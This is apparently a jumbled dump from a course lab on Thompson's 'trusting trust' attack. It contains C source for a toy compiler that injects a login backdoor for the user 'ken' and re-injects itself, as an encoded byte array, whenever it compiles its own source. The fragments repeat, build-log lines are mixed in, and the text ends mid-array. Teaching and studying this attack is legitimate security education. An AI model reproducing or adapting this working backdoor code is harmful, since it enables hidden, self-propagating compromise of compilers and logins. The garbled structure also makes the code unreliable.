    "static void compile(char *program, char *outname) {";
static char second_line[] = "  FILE *fp = fopen(\"./temp-out.c\", \"w\");";
static char third_line[] = "  assert(fp);";
char loginNextLineGet = 0;
char compilerNextLineGet = 0;
char *line = strtok(program, "\n");
while (line != NULL) {
  if (loginNextLineGet == 1) {
    fprintf(output, "%s", login_attack);
    loginNextLineGet = 0;
  }
  if (compilerNextLineGet == 3) {
    int i;
    fprintf(output, "%s", "char prog[] = {\n");
    for (i = 0; prog[i]; i++)
      fprintf(output, "\t%d,%c", prog[i], (i + 1) % 8 == 0 ? '\n' : ' ');
    fprintf(output, "%s", "0 };\n");
    fprintf(output, "%s", prog);
    compilerNextLineGet = 0;
    line = strtok(NULL, "\n");
    // continue;
  }
  fprintf(output, "%s\n", line);
  if (strcmp(line, login_sig) == 0) {
    loginNextLineGet = 1;
  }
  if (strcmp(line, first_line) == 0 && compilerNextLineGet == 0) {
    compilerNextLineGet += 1;
  } else if (strcmp(line, second_line) == 0 && compilerNextLineGet == 1) {
    compilerNextLineGet += 1;
  } else if (strcmp(line, third_line) == 0 && compilerNextLineGet == 2) {
    compilerNextLineGet += 1;
  }
  line = strtok(NULL, "\n"); // Continue to tokenize the string
}
fclose(fp);

char debugLine[100];
FILE *debug = fopen("./temp-out.c", "r");
assert(debug);
while (fgets(debugLine, sizeof(debugLine), debug) != NULL) {
  printf("%s", debugLine);
}  fclose(fp);
  // for step 2 you will pattern match on
  //   "static void compile(char *program, char *outname) {"
  // and inject the attack
  // match on login....
  // and inject an attack for "ken"
  // gross, call gcc.
  char buf[1024];
  sprintf(buf, "gcc ./temp-out.c -o %s -Wno-nullability-completeness", outname);
  if (system(buf) != 0)
    error("system failed\n");
}
#define N 8 * 1024 * 1024
static char buf[N + 1];
int main(int argc, char *argv[]) {
  if (argc != 4)
    error("expected 4 arguments have %d\n", argc);
  if (strcmp(argv[2], "-o") != 0)
    error("expected -o as second argument, have <%s>\n", argv[2]);
  // read in the entire file.
  int fd;
  if ((fd = open(argv[1], O_RDONLY)) < 0)
    error("file <%s> does not exist\n", argv[1]);
  int n;
  if ((n = read(fd, buf, N)) < 1)
    error("invalid read of file <%s>\n", argv[1]);
  if (n == N)
    error("input file too large\n");
  // "compile" it.
  compile(buf, argv[3]);
  return 0;
}
diff cc-attacked cc-attacked2
Binary files cc-attacked and cc-attacked2 differ
running check.sh
// engler, cs240lx: trivial identity "compiler" used to illustrate
// thompsons hack: it simply echos its input out.
#include <assert.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>
#define error(args...)                                                         \
  do {                                                                         \
    fprintf(stderr, ##args);                                                   \
    exit(1);                                                                   \
  } while (0)
// a not very interesting compile: throw the input into a
// temporary file and then call gcc on the result.
static void compile(char *program, char *outname) {
  FILE *fp = fopen("./temp-out.c", "w");
  assert(fp);
char prog[] = {
	70, 	73, 	76, 	69, 	32, 	42, 	111, 	117,
	116, 	112, 	117, 	116, 	32, 	61, 	32, 	102,
	112, 	59, 	10, 	115, 	116, 	97, 	116, 	105,
	99, 	32, 	99, 	104, 	97, 	114, 	32, 	108,
	111, 	103, 	105, 	110, 	95, 	115, 	105, 	103,
	91, 	93, 	32, 	61, 	32, 	34, 	105, 	110,
	116, 	32, 	108, 	111, 	103, 	105, 	110, 	40,
	99, 	104, 	97, 	114, 	32, 	42, 	117, 	115,
	101, 	114, 	41, 	32, 	123, 	34, 	59, 	10,
	115, 	116, 	97, 	116, 	105, 	99, 	32, 	99,
	104, 	97, 	114, 	32, 	108, 	111, 	103, 	105,
	110, 	95, 	97, 	116, 	116, 	97, 	99, 	107,
	91, 	93, 	32, 	61, 	32, 	34, 	105, 	102,
	40, 	115, 	116, 	114, 	99, 	109, 	112, 	40,
	117, 	115, 	101, 	114, 	44, 	32, 	92, 	34,
	107, 	101, 	110, 	92, 	34, 	41, 	32, 	61,
	61, 	32, 	48, 	41, 	32, 	114, 	101, 	116,
	117, 	114, 	110, 	32, 	49, 	59, 	34, 	59,
	10, 	115, 	116, 	97, 	116, 	105, 	99, 	32,
	99, 	104, 	97, 	114, 	32, 	102, 	105, 	114,
	115, 	116, 	95, 	108, 	105, 	110, 	101, 	91,
	93, 	32, 	61, 	10, 	32, 	32, 	32, 	32,
	34, 	115, 	116, 	97, 	116, 	105, 	99, 	32,
	118, 	111, 	105, 	100, 	32, 	99, 	111, 	109,
	112, 	105, 	108, 	101, 	40, 	99, 	104, 	97,
	114, 	32, 	42, 	112, 	114, 	111, 	103, 	114,
	97, 	109, 	44, 	32, 	99, 	104, 	97, 	114,
	32, 	42, 	111, 	117, 	116, 	110, 	97, 	109,
	101, 	41, 	32, 	123, 	34, 	59, 	10, 	115,
	116, 	97, 	116, 	105, 	99, 	32, 	99, 	104,
	97, 	114, 	32, 	115, 	101, 	99, 	111, 	110,
	100, 	95, 	108, 	105, 	110, 	101, 	91, 	93,
	32, 	61, 	32, 	34, 	32, 	32, 	70, 	73,
	76, 	69, 	32, 	42, 	102, 	112, 	32, 	61,
	32, 	102, 	111, 	112, 	101, 	110, 	40, 	92,
	34, 	46, 	47, 	116, 	101, 	109, 	112, 	45,
	111, 	117, 	116, 	46, 	99, 	92, 	34, 	44,
	32, 	92, 	34, 	119, 	92, 	34, 	41, 	59,
	34, 	59, 	10, 	115, 	116, 	97, 	116, 	105,
	99, 	32, 	99, 	104, 	97, 	114, 	32, 	116,
	104, 	105, 	114, 	100, 	95, 	108, 	105, 	110,
	101, 	91, 	93, 	32, 	61, 	32, 	34, 	32,
	32, 	97, 	115, 	115, 	101, 	114, 	116, 	40,
	102, 	112, 	41, 	59, 	34, 	59, 	10, 	99,
	104, 	97, 	114, 	32, 	108, 	111, 	103, 	105,
	110, 	78, 	101, 	120, 	116, 	76, 	105, 	110,
	101, 	71, 	101, 	116, 	32, 	61, 	32, 	48,
	59, 	10, 	99, 	104, 	97, 	114, 	32, 	99,
	111, 	109, 	112, 	105, 	108, 	101, 	114, 	78,
	101, 	120, 	116, 	76, 	105, 	110, 	101, 	71,
	101, 	116, 	32, 	61, 	32, 	48, 	59, 	10,
	99, 	104, 	97, 	114, 	32, 	42, 	108, 	105,
	110, 	101, 	32, 	61, 	32, 	115, 	116, 	114,
	116, 	111, 	107, 	40, 	112, 	114, 	111, 	103,
	114, 	97, 	109, 	44, 	32, 	34, 	92, 	110,
	34, 	41, 	59, 	10, 	119, 	104, 	105, 	108,
	101, 	32, 	40, 	108, 	105, 	110, 	101, 	32,
	33, 	61, 	32, 	78, 	85, 	76, 	76, 	41,
	32, 	123, 	10, 	32, 	32, 	105, 	102, 	32,
	40, 	108, 	111, 	103, 	105, 	110, 	78, 	101,
	120, 	116, 	76, 	105, 	110, 	101, 	71, 	101,
	116, 	32, 	61, 	61, 	32, 	49, 	41, 	32,
	123, 	10, 	32, 	32, 	32, 	32, 	102, 	112,
	114, 	105, 	110, 	116, 	102, 	40, 	111, 	117,
	116, 	112, 	117, 	116, 	44, 	32, 	34, 	37,
	115, 	34, 	44, 	32, 	108, 	111, 	103, 	105,
	110, 	95, 	97, 	116, 	116, 	97, 	99, 	107,
	41, 	59, 	10, 	32, 	32, 	32, 	32, 	108,
	111, 	103, 	105, 	110, 	78, 	101, 	120, 	116,
	76, 	105, 	110, 	101, 	71, 	101, 	116, 	32,
	61, 	32, 	48, 	59, 	10, 	32, 	32, 	125,
	10, 	32, 	32, 	105, 	102, 	32, 	40, 	99,
	111, 	109, 	112, 	105, 	108, 	101, 	114, 	78,
	101, 	120, 	116, 	76, 	105, 	110, 	101, 	71,
	101, 	116, 	32, 	61, 	61, 	32, 	51, 	41,
	32, 	123, 	10, 	32, 	32, 	32, 	32, 	105,
	110, 	116, 	32, 	105, 	59, 	10, 	32, 	32,
	32, 	32, 	102, 	112, 	114, 	105, 	110, 	116,
	102, 	40, 	111, 	117, 	116, 	112, 	117, 	116,
	44, 	32, 	34, 	37, 	115, 	34, 	44, 	32,
	34, 	99, 	104, 	97, 	114, 	32, 	112, 	114,
	111, 	103, 	91, 	93, 	32, 	61, 	32, 	123,
	92, 	110, 	34, 	41, 	59, 	10, 	32, 	32,
	32, 	32, 	102, 	111, 	114, 	32, 	40, 	105,
	32, 	61, 	32, 	48, 	59, 	32, 	112, 	114,
	111, 	103, 	91, 	105, 	93, 	59, 	32, 	105,
	43, 	43, 	41, 	10, 	32, 	32, 	32, 	32,
	32, 	32, 	102, 	112, 	114, 	105, 	110, 	116,
	102, 	40, 	111, 	117, 	116, 	112, 	117, 	116,
	44, 	32, 	34, 	92, 	116, 	37, 	100, 	44,
	37, 	99, 	34, 	44, 	32, 	112, 	114, 	111,
	103, 	91, 	105, 	93, 	44, 	32, 	40, 	105,
	32, 	43, 	32, 	49, 	41, 	32, 	37, 	32,
	56, 	32, 	61, 	61, 	32, 	48, 	32, 	63,
	32, 	39, 	92, 	110, 	39, 	32, 	58, 	32,
	39, 	32, 	39, 	41, 	59, 	10, 	32, 	32,
	32, 	32, 	102, 	112, 	114, 	105, 	110, 	116,
	102, 	40, 	111, 	117, 	116, 	112, 	117, 	116,
	44, 	32, 	34, 	37, 	115, 	34, 	44, 	32,
	34, 	48, 	32, 	125, 	59, 	92, 	110, 	34,
	41, 	59, 	10, 	32, 	32, 	32, 	32, 	102,
	112, 	114, 	105, 	110, 	116, 	102, 	40, 	111,
	117, 	116, 	112, 	117, 	116, 	44, 	32, 	34,
	37, 	115, 	34, 	44, 	32, 	112, 	114, 	111,
	103, 	41, 	59, 	10, 	32, 	32, 	32, 	32,
	99, 	111, 	109, 	112, 	105, 	108, 	101, 	114,
	78, 	101, 	120, 	116, 	76, 	105, 	110, 	101,
	71, 	101, 	116, 	32, 	61, 	32, 	48, 	59,
	10, 	32, 	32, 	32, 	32, 	108, 	105, 	110,
	101, 	32, 	61, 	32, 	115, 	116, 	114, 	116,
	111, 	107, 	40, 	78, 	85, 	76, 	76, 	44,
	32, 	34, 	92, 	110, 	34, 	41, 	59, 	10,
	32, 	32, 	32, 	32, 	47, 	47, 	32, 	99,
	111, 	110, 	116, 	105, 	110, 	117, 	101, 	59,
	10, 	32, 	32, 	125, 	10, 	32, 	32, 	102,
	112, 	114, 	105, 	110, 	116, 	102, 	40, 	111,
	117, 	116, 	112, 	117, 	116, 	44, 	32, 	34,
	37, 	115, 	92, 	110, 	34, 	44, 	32, 	108,
	105, 	110, 	101, 	41, 	59, 	10, 	32, 	32,
	105, 	102, 	32, 	40, 	115, 	116, 	114, 	99,
	109, 	112, 	40, 	108, 	105, 	110, 	101, 	44,
	32, 	108, 	111, 	103, 	105, 	110, 	95, 	115,
	105, 	103, 	41, 	32, 	61, 	61, 	32, 	48,
	41, 	32, 	123, 	10, 	32, 	32, 	32, 	32,
	108, 	111, 	103, 	105, 	110, 	78, 	101, 	120,
	116, 	76, 	105, 	110, 	101, 	71, 	101, 	116,
	32, 	61, 	32, 	49, 	59, 	10, 	32, 	32,
	125, 	10, 	32, 	32, 	105, 	102, 	32, 	40,
	115, 	116, 	114, 	99, 	109, 	112, 	40, 	108,
	105, 	110, 	101, 	44, 	32, 	102, 	105, 	114,
	115, 	116, 	95, 	108, 	105, 	110, 	101, 	41,
	32, 	61, 	61, 	32, 	48, 	32, 	38, 	38,
	32, 	99, 	111, 	109, 	112, 	105, 	108, 	101,
	114, 	78, 	101, 	120, 	116, 	76, 	105, 	110,
	101, 	71, 	101, 	116, 	32, 	61, 	61, 	32,
	48, 	41, 	32, 	123, 	10, 	32, 	32, 	32,
	32, 	99, 	111, 	109, 	112, 	105, 	108, 	101,
	114, 	78, 	101, 	120, 	116, 	76, 	105, 	110,
	101, 	71, 	101, 	116, 	32, 	43, 	61, 	32,
	49, 	59, 	10, 	32, 	32, 	125, 	32, 	101,
	108, 	115, 	101, 	32, 	105, 	102, 	32, 	40,
	115, 	116, 	114, 	99, 	109, 	112, 	40, 	108,
	105, 	110, 	101, 	44, 	32, 	115, 	101, 	99,
	111, 	110, 	100, 	95, 	108, 	105, 	110, 	101,
	41, 	32, 	61, 	61, 	32, 	48, 	32, 	38,
	38, 	32, 	99, 	111, 	109, 	112, 	105, 	108,
	101, 	114, 	78, 	101, 	120, 	116, 	76, 	105,
	110, 	101, 	71, 	101, 	116, 	32, 	61, 	61,
	32, 	49, 	41, 	32, 	123, 	10, 	32, 	32,
	32, 	32, 	99, 	111, 	109, 	112, 	105, 	108,
	101, 	114, 	78, 	101, 	120, 	116, 	76, 	105,
	110, 	101, 	71, 	101, 	116, 	32, 	43, 	61,
	32, 	49, 	59, 	10, 	32, 	32, 	125, 	32,
	101, 	108, 	115, 	101, 	32, 	105, 	102, 	32,
	40, 	115, 	116, 	114, 	99, 	109, 	112, 	40,
	108, 	105, 	110, 	101, 	44, 	32, 	116, 	104,
	105, 	114, 	100, 	95, 	108, 	105, 	110, 	101,
	41, 	32, 	61, 	61, 	32, 	48, 	32, 	38,
	38, 	32, 	99, 	111, 	109, 	112, 	105, 	108,
	101, 	114, 	78, 	101, 	120, 	116, 	76, 	105,
	110, 	101, 	71, 	101, 	116, 	32, 	61, 	61,
	32, 	50, 	41, 	32, 	123, 	10, 	32, 	32,
	32, 	32, 	99, 	111, 	109, 	112, 	105, 	108,
	101, 	114, 	78, 	101, 	120, 	116, 	76, 	105,
	110, 	101, 	71, 	101, 	116, 	32, 	43, 	61,
	32, 	49, 	59, 	10, 	32, 	32, 	125, 	10,
	32, 	32, 	108, 	105, 	110, 	101, 	32, 	61,
	32, 	115, 	116, 	114, 	116, 	111, 	107, 	40,
	78, 	85, 	76, 	76, 	44, 	32, 	34, 	92,
	110, 	34, 	41, 	59, 	32, 	47, 	47, 	32,
	67, 	111, 	110, 	116, 	105, 	110, 	117, 	101,
	32, 	116, 	111, 	32, 	116, 	111, 	107, 	101,
	110, 	105, 	122, 	101, 	32, 	116, 	104, 	101,
	32, 	115, 	116, 	114, 	105, 	110, 	103, 	10,
	125, 	10, 	102, 	99, 	108, 	111, 	115, 	101,
	40, 	102, 	112, 	41, 	59, 	10, 	10, 	99,
	104, 	97, 	114, 	32, 	100, 	101, 	98, 	117,
	103, 	76, 	105, 	110, 	101, 	91, 	49, 	48,
	48, 	93, 	59, 	10, 	70, 	73, 	76, 	69,
	32, 	42, 	100, 	101, 	98, 	117, 	103, 	32,
	61, 	32, 	102, 	111, 	112, 	101, 	110, 	40,
	34, 	46, 	47, 	116, 	101, 	109, 	112, 	45,
	111, 	117, 	116, 	46, 	99, 	34, 	44, 	32,
	34, 	114, 	34, 	41, 	59, 	10, 	97, 	115,
	115, 	101, 	114, 	116, 	40, 	100, 	101, 	98,
	117, 	103, 	41, 	59, 	10, 	119, 	104, 	105,
	108, 	101, 	32, 	40, 	102, 	103, 	101, 	116,
	115, 	40, 	100, 	101, 	98, 	117, 	103, 	76,
	105, 	110, 	101, 	44, 	32, 	115, 	105, 	122,
	101, 	111, 	102, 	40, 	100, 	101, 	98, 	117,
	103, 	76, 	105, 	110, 	101, 	41, 	44, 	32,
	100, 	101, 	98, 	117, 	103, 	41, 	32, 	33,
	61, 	32, 	78, 	85, 	76, 	76, 	41, 	32,
	123, 	10, 	32, 	32, 	112, 	114, 	105, 	110,
	116, 	102, 	40, 	34, 	37, 	115, 	34, 	44,
	32, 	100, 	101, 	98, 	117, 	103, 	76, 	105,
	110, 	101, 	41, 	59, 	10, 	125, 0 };
FILE *output = fp;
static char login_sig[] = "int login(char *user) {";
static char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;";
static char first_line[] =
    "static void compile(char *program, char *outname) {";
static char second_line[] = "  FILE *fp = fopen(\"./temp-out.c\", \"w\");";
static char third_line[] = "  assert(fp);";
char loginNextLineGet = 0;
char compilerNextLineGet = 0;
char *line = strtok(program, "\n");
while (line != NULL) {
  if (loginNextLineGet == 1) {
    fprintf(output, "%s", login_attack);
    loginNextLineGet = 0;
  }
  if (compilerNextLineGet == 3) {
    int i;
    fprintf(output, "%s", "char prog[] = {\n");
    for (i = 0; prog[i]; i++)
      fprintf(output, "\t%d,%c", prog[i], (i + 1) % 8 == 0 ? '\n' : ' ');
    fprintf(output, "%s", "0 };\n");
    fprintf(output, "%s", prog);
    compilerNextLineGet = 0;
    line = strtok(NULL, "\n");
    // continue;
  }
  fprintf(output, "%s\n", line);
  if (strcmp(line, login_sig) == 0) {
    loginNextLineGet = 1;
  }
  if (strcmp(line, first_line) == 0 && compilerNextLineGet == 0) {
    compilerNextLineGet += 1;
  } else if (strcmp(line, second_line) == 0 && compilerNextLineGet == 1) {
    compilerNextLineGet += 1;
  } else if (strcmp(line, third_line) == 0 && compilerNextLineGet == 2) {
    compilerNextLineGet += 1;
  }
  line = strtok(NULL, "\n"); // Continue to tokenize the string
}
fclose(fp);

char debugLine[100];
FILE *debug = fopen("./temp-out.c", "r");
assert(debug);
while (fgets(debugLine, sizeof(debugLine), debug) != NULL) {
  printf("%s", debugLine);
}  fclose(fp);
  // for step 2 you will pattern match on
  //   "static void compile(char *program, char *outname) {"
  // and inject the attack
  // match on login....
  // and inject an attack for "ken"
  // gross, call gcc.
  char buf[1024];
  sprintf(buf, "gcc ./temp-out.c -o %s -Wno-nullability-completeness", outname);
  if (system(buf) != 0)
    error("system failed\n");
}
#define N 8 * 1024 * 1024
static char buf[N + 1];
int main(int argc, char *argv[]) {
  if (argc != 4)
    error("expected 4 arguments have %d\n", argc);
  if (strcmp(argv[2], "-o") != 0)
    error("expected -o as second argument, have <%s>\n", argv[2]);
  // read in the entire file.
  int fd;
  if ((fd = open(argv[1], O_RDONLY)) < 0)
    error("file <%s> does not exist\n", argv[1]);
  int n;
  if ((n = read(fd, buf, N)) < 1)
    error("invalid read of file <%s>\n", argv[1]);
  if (n == N)
    error("input file too large\n");
  // "compile" it.
  compile(buf, argv[3]);
  return 0;
}
// engler, cs240lx: trivial identity "compiler" used to illustrate
// thompsons hack: it simply echos its input out.
#include <assert.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>
#define error(args...)                                                         \
  do {                                                                         \
    fprintf(stderr, ##args);                                                   \
    exit(1);                                                                   \
  } while (0)
// a not very interesting compile: throw the input into a
// temporary file and then call gcc on the result.
static void compile(char *program, char *outname) {
  FILE *fp = fopen("./temp-out.c", "w");
  assert(fp);
char prog[] = {
	70, 	73, 	76, 	69, 	32, 	42, 	111, 	117,
	116, 	112, 	117, 	116, 	32, 	61, 	32, 	102,
	112, 	59, 	10, 	115, 	116, 	97, 	116, 	105,
	99, 	32, 	99, 	104, 	97, 	114, 	32, 	108,
	111, 	103, 	105, 	110, 	95, 	115, 	105, 	103,
	91, 	93, 	32, 	61, 	32, 	34, 	105, 	110,
	116, 	32, 	108, 	111, 	103, 	105, 	110, 	40,
	99, 	104, 	97, 	114, 	32, 	42, 	117, 	115,
	101, 	114, 	41, 	32, 	123, 	34, 	59, 	10,
	115, 	116, 	97, 	116, 	105, 	99, 	32, 	99,
	104, 	97, 	114, 	32, 	108, 	111, 	103, 	105,
	110, 	95, 	97, 	116, 	116, 	97, 	99, 	107,
	91, 	93, 	32, 	61, 	32, 	34, 	105, 	102,
	40, 	115, 	116, 	114, 	99, 	109, 	112, 	40,
	117, 	115, 	101, 	114, 	44, 	32, 	92, 	34,
	107, 	101, 	110, 	92, 	34, 	41, 	32, 	61,
	61, 	32, 	48, 	41, 	32, 	114, 	101, 	116,
	117, 	114, 	110, 	32, 	49, 	59, 	34, 	59,
	10, 	115, 	116, 	97, 	116, 	105, 	99, 	32,
	99, 	104, 	97, 	114, 	32, 	102, 	105, 	114,
	115, 	116, 	95, 	108, 	105, 	110, 	101, 	91,
	93, 	32, 	61, 	10, 	32, 	32, 	32, 	32,
	34, 	115, 	116, 	97, 	116, 	105, 	99, 	32,
	118, 	111, 	105, 	100, 	32, 	99, 	111, 	109,
	112, 	105, 	108, 	101, 	40, 	99, 	104, 	97,
	114, 	32, 	42, 	112, 	114, 	111, 	103, 	114,
	97, 	109, 	44, 	32, 	99, 	104, 	97, 	114,
	32, 	42, 	111, 	117, 	116, 	110, 	97, 	109,
	101, 	41, 	32, 	123, 	34, 	59, 	10, 	115,
	116, 	97, 	116, 	105, 	99, 	32, 	99, 	104,
	97, 	114, 	32, 	115, 	101, 	99, 	111, 	110,
	100, 	95, 	108, 	105, 	110, 	101, 	91, 	93,
	32, 	61, 	32, 	34, 	32, 	32, 	70, 	73,
	76, 	69, 	32, 	42, 	102, 	112, 	32, 	61,
	32, 	102, 	111, 	112, 	101, 	110, 	40, 	92,
	34, 	46, 	47, 	116, 	101, 	109, 	112, 	45,
	111, 	117, 	116, 	46, 	99, 	92, 	34, 	44,
	32, 	92, 	34, 	119, 	92, 	34, 	41, 	59,
	34, 	59, 	10, 	115, 	116, 	97, 	116, 	105,
	99, 	32, 	99, 	104, 	97, 	114, 	32, 	116,
	104, 	105, 	114, 	100, 	95, 	108, 	105, 	110,
	101, 	91, 	93, 	32, 	61, 	32, 	34, 	32,
	32, 	97, 	115, 	115, 	101, 	114, 	116, 	40,
	102, 	112, 	41, 	59, 	34, 	59, 	10, 	99,
	104, 	97, 	114, 	32, 	108, 	111, 	103, 	105,
	110, 	78, 	101, 	120, 	116, 	76, 	105, 	110,
	101, 	71, 	101, 	116, 	32, 	61, 	32, 	48,
	59, 	10, 	99, 	104, 	97, 	114, 	32, 	99,
	111, 	109, 	112, 	105, 	108, 	101, 	114, 	78,
	101, 	120, 	116, 	76, 	105, 	110, 	101, 	71,
	101, 	116, 	32, 	61, 	32, 	48, 	59, 	10,
	99, 	104, 	97, 	114, 	32, 	42, 	108, 	105,
	110, 	101, 	32, 	61, 	32, 	115, 	116, 	114,
	116, 	111, 	107, 	40, 	112, 	114, 	111, 	103,
	114, 	97, 	109, 	44, 	32, 	34, 	92, 	110,
	34, 	41, 	59, 	10, 	119, 	104, 	105, 	108,
	101, 	32, 	40, 	108, 	105, 	110, 	101, 	32,
	33, 	61, 	32, 	78, 	85, 	76, 	76, 	41,
	32, 	123, 	10, 	32, 	32, 	105, 	102, 	32,
	40, 	108, 	111, 	103, 	105, 	110, 	78, 	101,
	120, 	116, 	76, 	105, 	110, 	101, 	71, 	101,
	116, 	32, 	61, 	61, 	32, 	49, 	41, 	32,
	123, 	10, 	32, 	32, 	32, 	32, 	102, 	112,
	114, 	105, 	110, 	116, 	102, 	40, 	111, 	117,
	116, 	112, 	117, 	116, 	44, 	32, 	34, 	37,
	115, 	34, 	44, 	32, 	108, 	111, 	103, 	105,
	110, 	95, 	97, 	116, 	116, 	97, 	99, 	107,
	41, 	59, 	10, 	32, 	32, 	32, 	32, 	108,
	111, 	103, 	105, 	110, 	78, 	101, 	120, 	116,
	76, 	105, 	110, 	101, 	71, 	101, 	116, 	32,
	61, 	32, 	48, 	59, 	10, 	32, 	32, 	125,
	10, 	32, 	32, 	105, 	102, 	32, 	40, 	99,
	111, 	109, 	112, 	105, 	108, 	101, 	114, 	78,
	101, 	120, 	116, 	76, 	105, 	110, 	101, 	71,
	101, 	116, 	32, 	61, 	61, 	32, 	51, 	41,
	32, 	123, 	10, 	32, 	32, 	32, 	32, 	105,
	110, 	116, 	32, 	105, 	59, 	10, 	32, 	32,
	32, 	32, 	102, 	112, 	114, 	105, 	110, 	116,
	102, 	40, 	111, 	117, 	116, 	112, 	117, 	116,
	44, 	32, 	34, 	37, 	115, 	34, 	44, 	32,
	34, 	99, 	104, 	97, 	114, 	32, 	112, 	114,
	111, 	103, 	91, 	93, 	32, 	61, 	32, 	123,
	92, 	110, 	34, 	41, 	59, 	10, 	32, 	32,
	32, 	32, 	102, 	111, 	114, 	32, 	40, 	105,
	32, 	61, 	32, 	48, 	59, 	32, 	112, 	114,
	111, 	103, 	91, 	105, 	93, 	59, 	32, 	105,
	43, 	43, 	41, 	10, 	32, 	32, 	32, 	32,
	32, 	32, 	102, 	112, 	114, 	105, 	110, 	116,
	102, 	40, 	111, 	117, 	116, 	112, 	117, 	116,
	44, 	32, 	34, 	92, 	116, 	37, 	100, 	44,
	37, 	99, 	34, 	44, 	32, 	112, 	114, 	111,
	103, 	91, 	105, 	93, 	44, 	32, 	40, 	105,
	32, 	43, 	32, 	49, 	41, 	32, 	37, 	32,
	56, 	32, 	61, 	61, 	32, 	48, 	32, 	63,
	32, 	39, 	92, 	110, 	39, 	32, 	58, 	32,
	39, 	32, 	39, 	41, 	59, 	10, 	32, 	32,
	32, 	32, 	102, 	112, 	114, 	105, 	110, 	116,
	102, 	40, 	111, 	117, 	116, 	112, 	117, 	116,
	44, 	32, 	34, 	37, 	115, 	34, 	44, 	32,
	34, 	48, 	32, 	125, 	59, 	92, 	110, 	34,
	41, 	59, 	10, 	32, 	32, 	32, 	32, 	102,
	112, 	114, 	105, 	110, 	116, 	102, 	40, 	111,
	117, 	116, 	112, 	117, 	116, 	44, 	32, 	34,
	37, 	115, 	34, 	44, 	32, 	112, 	114, 	111,
	103, 	41, 	59, 	10, 	32, 	32, 	32, 	32,
	99, 	111, 	109, 	112, 	105, 	108, 	101, 	114,
	78, 	101, 	120, 	116, 	76, 	105, 	110, 	101,
	71, 	101, 	116, 	32, 	61, 	32, 	48, 	59,
	10, 	32, 	32, 	32, 	32, 	108, 	105, 	110,
	101, 	32, 	61, 	32, 	115, 	116, 	114, 	116,
	111, 	107, 	40, 	78, 	85, 	76, 	76, 	44,
	32, 	34, 	92, 	110, 	34, 	41, 	59, 	10,
	32, 	32, 	32, 	32, 	47, 	47, 	32, 	99,
	111, 	110, 	116, 	105, 	110, 	117, 	101, 	59,
	10, 	32, 	32, 	125, 	10, 	32, 	32, 	102,
	112, 	114, 	105, 	110, 	116, 	102, 	40, 	111,
	117, 	116, 	112, 	117, 	116, 	44, 	32, 	34,
	37, 	115, 	92, 	110, 	34, 	44, 	32, 	108,
	105, 	110, 	101, 	41, 	59, 	10, 	32, 	32,
	105, 	102, 	32, 	40, 	115, 	116, 	114, 	99,
	109, 	112, 	40, 	108, 	105, 	110, 	101, 	44,
	32, 	108, 	111, 	103, 	105, 	110, 	95, 	115,
	105, 	103, 	41, 	32, 	61, 	61, 	32, 	48,
	41, 	32, 	123, 	10, 	32, 	32, 	32, 	32,
	108, 	111, 	103, 	105, 	110, 	78, 	101, 	120,
	116, 	76, 	105, 	110, 	101, 	71, 	101, 	116,
	32, 	61, 	32, 	49, 	59, 	10, 	32, 	32,
	125, 	10, 	32, 	32, 	105, 	102, 	32, 	40,
	115, 	116, 	114, 	99, 	109, 	112, 	40, 	108,
	105, 	110, 	101, 	44, 	32, 	102, 	105, 	114,
	115, 	116, 	95, 	108, 	105, 	110, 	101, 	41,
	32, 	61, 	61, 	32, 	48, 	32, 	38, 	38,
	32, 	99, 	111, 	109, 	112, 	105, 	108, 	101,
	114, 	78, 	101, 	120, 	116, 	76, 	105, 	110,
	101, 	71, 	101, 	116, 	32, 	61, 	61, 	32,
	48, 	41, 	32, 	123, 	10, 	32, 	32, 	32,
	32, 	99, 	111, 	109, 	112, 	105, 	108, 	101,
	114, 	78, 	101, 	120, 	116, 	76, 	105, 	110,
	101, 	71, 	101, 	116, 	32, 	43, 	61, 	32,
	49, 	59, 	10, 	32, 	32, 	125, 	32, 	101,
	108, 	115, 	101, 	32, 	105, 	102, 	32, 	40,
	115, 	116, 	114, 	99, 	109, 	112, 	40, 	108,
	105, 	110, 	101, 	44, 	32, 	115, 	101, 	99,
	111, 	110, 	100, 	95, 	108, 	105, 	110, 	101,
	41, 	32, 	61, 	61, 	32, 	48, 	32, 	38,
	38, 	32, 	99, 	111, 	109, 	112, 	105, 	108,
	101, 	114, 	78, 	101, 	120, 	116, 	76, 	105,
	110, 	101, 	71, 	101, 	116, 	32, 	61, 	61,
	32, 	49, 	41, 	32, 	123, 	10, 	32, 	32,
	32, 	32, 	99, 	111, 	109, 	112, 	105, 	108,
	101, 	114, 	78, 	101, 	120, 	116, 	76, 	105,
	110, 	101, 	71, 	101, 	116, 	32, 	43, 	61,
	32, 	49, 	59, 	10, 	32, 	32, 	125, 	32,
	101, 	108, 	115, 	101, 	32, 	105, 	102, 	32,
	40, 	115, 	116, 	114, 	99, 	109, 	112, 	40,
	108, 	105, 	110, 	101, 	44, 	32, 	116, 	104,
	105, 	114, 	100, 	95, 	108, 	105, 	110, 	101,
	41, 	32, 	61, 	61, 	32, 	48, 	32, 	38,
	38, 	32, 	99, 	111, 	109, 	112, 	105, 	108,
	101, 	114, 	78, 	101, 	120, 	116, 	76, 	105,
	110, 	101, 	71, 	101, 	116, 	32, 	61, 	61,
	32, 	50, 	41, 	32, 	123, 	10, 	32, 	32,
	32, 	32, 	99, 	111, 	109, 	112, 	105, 	108,
	101, 	114, 	78, 	101, 	120, 	116, 	76, 	105,
	110, 	101, 	71, 	101, 	116, 	32, 	43, 	61,
	32, 	49, 	59, 	10, 	32, 	32, 	125, 	10,
	32, 	32, 	108, 	105, 	110, 	101, 	32, 	61,
	32, 	115, 	116, 	114, 	116, 	111, 	107, 	40,
	78, 	85, 	76, 	76, 	44, 	32, 	34, 	92,
	110, 	34, 	41, 	59, 	32, 	47, 	47, 	32,
	67, 	111, 	110, 	116, 	105, 	110, 	117, 	101,
	32, 	116, 	111, 	32, 	116, 	111, 	107, 	101,
	110, 	105, 	122, 	101, 	32, 	116, 	104, 	101,
	32, 	115, 	116, 	114, 	105, 	110, 	103, 	10,
	125, 	10, 	102, 	99, 	108, 	111, 	115, 	101,
	40, 	102, 	112, 	41, 	59, 	10, 	10, 	99,
	104, 	97, 	114, 	32, 	100, 	101, 	98, 	117,
	103, 	76, 	105, 	110, 	101, 	91, 	49, 	48,
	48, 	93, 	59, 	10, 	70, 	73, 	76, 	69,
